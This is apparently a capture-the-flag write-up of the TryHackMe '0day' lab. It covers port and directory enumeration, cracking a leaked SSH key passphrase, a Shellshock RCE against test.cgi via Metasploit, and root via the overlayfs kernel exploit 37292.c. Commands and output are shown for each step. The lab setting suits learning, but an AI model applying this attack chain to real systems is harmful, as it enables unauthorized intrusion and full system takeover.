Starting with the machine enumeration:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
|_  256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)

80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: 0day
|_http-server-header: Apache/2.4.7 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.4 (99%), Linux 3.10 - 3.13 (96%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (93%), Sony Android TV (Android 5.0) (93%), Android 5.0 - 6.0.1 (Linux 3.4) (93%), Android 5.1 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSH and HTTP are running on the machine. One thing to check is whether password authentication is enabled or not for SSH. Enabling SSH access with private key is way more secure than
password as password can be brute forced (even though it is slow, but still)

```
┌──(kali㉿kali)-[~/Desktop/THM/0day]
└─$ ssh root@0day.thm        
The authenticity of host '0day.thm (10.10.225.227)' can't be established.
ED25519 key fingerprint is SHA256:RagPojtI1X12KWTyYetHjXVozjQqsxNmneOUKEjxwU0.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:38: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '0day.thm' (ED25519) to the list of known hosts.
root@0day.thm's password: 
```

So it is enabled.

Enumerating the website, I have used dirsearch

```
[15:01:06] 301 -  303B  - /admin  ->  http://0day.thm/admin/                
[15:01:08] 200 -    0B  - /admin/                                           
[15:01:10] 200 -    0B  - /admin/index.html                                 
[15:01:47] 301 -  304B  - /backup  ->  http://0day.thm/backup/              
[15:01:47] 200 -    1KB - /backup/                                          
[15:01:56] 301 -  305B  - /cgi-bin  ->  http://0day.thm/cgi-bin/            
[15:01:56] 403 -  283B  - /cgi-bin/                                         
[15:01:56] 200 -   13B  - /cgi-bin/test.cgi                                 
[15:02:12] 301 -  301B  - /css  ->  http://0day.thm/css/                    
[15:02:41] 301 -  301B  - /img  ->  http://0day.thm/img/                    
[15:02:48] 200 -  448B  - /js/                                              
[15:03:34] 200 -   38B  - /robots.txt                                       
[15:03:36] 301 -  304B  - /secret  ->  http://0day.thm/secret/              
[15:03:37] 200 -   97B  - /secret/
[15:03:38] 403 -  288B  - /server-status                                    
[15:03:38] 403 -  289B  - /server-status/                                   
[15:04:01] 301 -  305B  - /uploads  ->  http://0day.thm/uploads/            
[15:04:02] 200 -    0B  - /uploads/ 
```

From the backups sub-directory, I got a RSA private key:

<img src=https://github.com/user-attachments/assets/8e5e9d8d-48d1-44d2-b335-5e2cac4222f4>

I tried to use this with SSH and learned that a passphrase is required.

```
┌──(kali㉿kali)-[~/Desktop/THM/0day]
└─$ ssh -i id_rsa root@0day.thm       
Enter passphrase for key 'id_rsa': 
```

Then I used ssh2john to convert the key to john readable and then used john to brute force the passphrase:

```
┌──(kali㉿kali)-[~/Desktop/THM/0day]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt passphrase 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
No password hashes left to crack (see FAQ)
                                                                                                                                                 
┌──(kali㉿kali)-[~/Desktop/THM/0day]
└─$ john passphrase --show                                     
id_rsa:letmein

1 password hash cracked, 0 left
```

But later, I found out that all these were useless. The main vulnerability was the cgi-bin/test.cgi, which was vulnerable to shellshock. Shellshock allows remote code execution.
I used the Metasploit framework to exploit this vulnerability.

```
exploit(multi/http/apache_mod_cgi_bash_env_exec)
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI http://0day.thm/cgi-bin/test.cgi
```

The `TARGETURI` is also to be set here. I got the shell and got to know a user on the machine, Ryan

```
www-data@ubuntu:/home$ ls
ls
ryan
www-data@ubuntu:/home$
```

I tried to log in to Ryan using SSH, assuming the private key was of the user Ryan, but there was no ssh folder in the user's directory.

Then I used the basic commands to get the system info (the hints helped here)

```
www-data@ubuntu:/home$ uname -a
uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux

www-data@ubuntu:/home$ cat /etc/os-release       
cat /etc/os-release
NAME="Ubuntu"
VERSION="14.04.1 LTS, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04.1 LTS"
VERSION_ID="14.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
```

- 64-bit arch
- Ubuntu version 14.04.1
- Kernel version 3.13

This version of Ubuntu is vulnerable. I searched in Metasploit for the vulnerability

```
┌──(kali㉿kali)-[~/Desktop/THM/0day]
└─$ searchsploit Ubuntu 14.04 3.13 Local Privilege Escalation
--------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                 |  Path
--------------------------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation           | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access / | linux/local/37293.txt
Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.04/13.10 x64) - 'CONFIG_X86_X32=y' Local Privilege Escalation (3)         | linux_x86-64/local/31347.c
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                  | linux/local/45010.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                         | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation              | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)          | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KA | linux/local/47169.c
Ubuntu < 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation                         | linux/local/41760.txt
--------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
The first one copied the file to the target machine and compiled and executed the file.

```
www-data@ubuntu:/tmp$ gcc 37292.c -o exploiting
gcc 37292.c -o exploiting
www-data@ubuntu:/tmp$ ls -l 
ls -l
total 32
-rw-r--r-- 1 www-data www-data  4968 Jan 13 02:21 37292.c
-rwxr-xr-x 1 www-data www-data 13652 Jan 13 02:23 exploiting
drwxr-xr-x 5 www-data www-data  4096 Jan 13 02:19 haxhax
-rwxrwxrwx 1 www-data www-data   207 Jan 13 01:57 xjsiY
www-data@ubuntu:/tmp$ ./exploiting
./exploiting
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# whoami
whoami
root
# 
```
